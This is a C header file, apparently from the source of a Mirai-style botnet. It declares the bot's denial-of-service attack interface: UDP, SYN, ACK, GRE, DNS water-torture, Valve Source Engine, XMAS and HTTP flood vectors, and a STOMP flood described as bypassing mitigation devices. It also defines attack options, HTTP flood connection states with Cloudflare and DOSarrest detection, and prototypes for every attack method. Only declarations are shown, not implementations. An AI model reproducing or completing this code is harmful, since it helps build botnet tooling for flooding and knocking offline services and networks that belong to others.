#pragma once
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include "includes.h"
#include "protocol.h"
#define ATTACK_CONCURRENT_MAX   15


#define HTTP_CONNECTION_MAX     256


struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};

struct attack_option {
    char *val;
    uint8_t key;
};

struct attack_xmas_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;

#define ATK_VEC_UDP        0  /* Straight up UDP flood */
#define ATK_VEC_VSE        1  /* Valve Source Engine query flood */
#define ATK_VEC_DNS        2  /* DNS water torture */
#define ATK_VEC_SYN        3  /* SYN flood with options */
#define ATK_VEC_ACK        4  /* ACK flood */
#define ATK_VEC_STOMP      5  /* ACK flood to bypass mitigation devices */
#define ATK_VEC_GREIP      6  /* GRE IP flood */
#define ATK_VEC_GREETH     7  /* GRE Ethernet flood */
#define ATK_VEC_UDP_PLAIN  8  /* Plain UDP flood optimized for speed */
#define ATK_VEC_HTTP       9 /* HTTP layer 7 flood */
#define ATK_VEC_STD        10
#define ATK_VEC_HEX        11
#define ATK_VEC_XMAS       12
#define ATK_VEC_CFNULL     13

#define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
#define ATK_OPT_PAYLOAD_RAND    1   // Should we randomize the packet data contents?
#define ATK_OPT_IP_TOS          2   // tos field in IP header
#define ATK_OPT_IP_IDENT        3   // ident field in IP header
#define ATK_OPT_IP_TTL          4   // ttl field in IP header
#define ATK_OPT_IP_DF           5   // Dont-Fragment bit set
#define ATK_OPT_SPORT           6   // Should we force a source port? (0 = random)
#define ATK_OPT_DPORT           7   // Should we force a dest port? (0 = random)
#define ATK_OPT_DOMAIN          8   // Domain name for DNS attack
#define ATK_OPT_DNS_HDR_ID      9   // Domain name header ID
#define ATK_OPT_URG             10  // TCP URG header flag
#define ATK_OPT_ACK             11  // TCP ACK header flag
#define ATK_OPT_PSH             12  // TCP PSH header flag
#define ATK_OPT_RST             13  // TCP RST header flag
#define ATK_OPT_SYN             14  // TCP SYN header flag
#define ATK_OPT_FIN             15  // TCP FIN header flag
#define ATK_OPT_SEQRND          16  // Should we force the sequence number? (TCP only)
#define ATK_OPT_ACKRND          17  // Should we force the ack number? (TCP only)
#define ATK_OPT_GRE_CONSTIP     18  // Should the encapsulated destination address be the same as the target?
#define ATK_OPT_METHOD			19	// Method for HTTP flood
#define ATK_OPT_POST_DATA		20	// Any data to be posted with HTTP flood
#define ATK_OPT_PATH            21  // The path for the HTTP flood
#define ATK_OPT_HTTPS           22  // Is this URL SSL/HTTPS?
#define ATK_OPT_CONNS           23  // Number of sockets to use
#define ATK_OPT_SOURCE          24  // Source IP
#define ATK_OPT_HOST            25
#define ATK_OPT_TIME            26
#define ATK_OPT_THREADS         27
#define ATK_OPT_LENGTH			28

struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

struct attack_stomp_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

#define HTTP_CONN_INIT          0 // Inital state
#define HTTP_CONN_RESTART       1 // Scheduled to restart connection next spin
#define HTTP_CONN_CONNECTING    2 // Waiting for it to connect
#define HTTP_CONN_HTTPS_STUFF   3 // Handle any needed HTTPS stuff such as negotiation
#define HTTP_CONN_SEND          4 // Sending HTTP request
#define HTTP_CONN_SEND_HEADERS  5 // Send HTTP headers 
#define HTTP_CONN_RECV_HEADER   6 // Get HTTP headers and check for things like location or cookies etc
#define HTTP_CONN_RECV_BODY     7 // Get HTTP body and check for cf iaua mode
#define HTTP_CONN_SEND_JUNK		8 // Send as much data as possible
#define HTTP_CONN_SNDBUF_WAIT   9 // Wait for socket to be available to be written to
#define HTTP_CONN_QUEUE_RESTART 10 // restart the connection/send new request BUT FIRST read any other available data.
#define HTTP_CONN_CLOSED        11 // Close connection and move on

#define HTTP_RDBUF_SIZE         1024
#define HTTP_HACK_DRAIN         64
#define HTTP_PATH_MAX           256
#define HTTP_DOMAIN_MAX         128
#define HTTP_COOKIE_MAX         5   // no more then 5 tracked cookies
#define HTTP_COOKIE_LEN_MAX     128 // max cookie len
#define HTTP_POST_MAX           512 // max post data len

#define HTTP_PROT_DOSARREST     1 // Server: DOSarrest
#define HTTP_PROT_CLOUDFLARE    2 // Server: cloudflare-nginx

struct attack_http_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char path[HTTP_PATH_MAX + 1];
    char domain[HTTP_DOMAIN_MAX + 1];
    char postdata[HTTP_POST_MAX + 1];
    char method[9];
    char orig_method[9];

    int protection_type;

    int keepalive;
    int chunked;
    int content_length;

    int num_cookies;
    char cookies[HTTP_COOKIE_MAX][HTTP_COOKIE_LEN_MAX];

    int rdbuf_pos;
    char rdbuf[HTTP_RDBUF_SIZE];
};

struct attack_cfnull_state {
    int fd;
    uint8_t state;
    int last_recv;
    int last_send;
    ipv4_t dst_addr;
    char user_agent[512];
    char domain[HTTP_DOMAIN_MAX + 1];
    int to_send;
};

BOOL attack_init(void);
void attack_kill_all(void);
void attack_parse(char *, int);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);
/* Actual attacks */
void attack_method_udpgeneric(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_kill();
void attack_method_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_udpplain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_std(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_greip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_greeth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_hex(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_method_xmas(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_app_cfnull(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
static void free_opts(struct attack_option *, int);
